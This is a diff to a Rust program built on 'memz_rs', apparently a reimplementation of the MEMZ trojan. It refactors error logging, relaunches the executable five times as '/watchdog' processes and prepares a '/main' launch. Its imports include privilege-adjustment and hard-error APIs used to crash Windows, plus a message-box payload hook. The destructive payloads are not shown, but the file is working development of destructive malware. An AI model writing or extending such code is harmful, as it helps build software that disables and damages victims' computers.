@@ -1,5 +1,6 @@
 #![allow(unused_imports)]
 #![allow(dead_code)]
+use ::log::error;
 #[cfg(all(feature = "DEBUG_MODE", feature = "WTACHDOG"))]
 use ::log::{error, info};
 
@@ -11,7 +12,7 @@ use memz_rs::{
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
     payloads::payloads::msg_box_hook,
-    utils::log,
+    utils::log::{self, write_log, LogType},
     wrap_windows_api::*,
     LMEM_ZEROINIT,
 };
@@ -35,7 +36,7 @@ use windows::{
             Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
         },
         UI::{
-            Shell::ShellExecuteA,
+            Shell::{ShellExecuteA, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
             WindowsAndMessaging::{
                 CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
                 HCURSOR, HICON, HMENU, IDYES, MB_ICONHAND, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL,
@@ -156,9 +157,11 @@ fn main() -> Result<(), WinError> {
         while wrap_get_message(&mut msg, hwnd, 0, 0)? {
             unsafe {
                 if !TranslateMessage(&mut msg).as_bool() {
-                    return Err(eprintln!(
-                        "Failed TranslateMessage()\nError: message is not translated"
-                    ));
+                    write_log(
+                        LogType::ERROR,
+                        "Failed TranslateMessage()\nError: message is not translated",
+                    );
+                    return Err(WinError::Failed);
                 };
 
                 DispatchMessageA(&mut msg); // return value generally is ignored
@@ -186,19 +189,28 @@ fn main() -> Result<(), WinError> {
     let path = std::str::from_utf8(&fn_buf).unwrap();
 
     for _ in 0..5 {
-        unsafe {
-            ShellExecuteA(
-                HWND(0),
-                PCSTR::null(),
-                *path.to_pcstr(),
-                *"/watchdog".to_pcstr(),
-                PCSTR::null(),
-                SW_SHOWDEFAULT,
-            );
-        }
+        wrap_shell_execute_a(
+            HWND(0),
+            PCSTR::null(),
+            *path.to_pcstr(),
+            *"/watchdog".to_pcstr(),
+            PCSTR::null(),
+            SW_SHOWDEFAULT,
+        )?;
     }
 
-    // todo!()
+    let info = SHELLEXECUTEINFOA {
+        cbSize: size_of::<SHELLEXECUTEINFOA>() as u32,
+        fMask: SEE_MASK_NOCLOSEPROCESS,
+        hwnd: HWND(0),
+        lpVerb: PCSTR::null(),
+        lpFile: *path.to_pcstr(),
+        lpParameters: *"/main".to_pcstr(),
+        lpDirectory: PCSTR::null(),
+        nShow: SW_SHOWDEFAULT.0 as i32,
+        hInstApp: HMODULE(0),
+        ..Default::default()
+    };
 
     Ok(())
 }
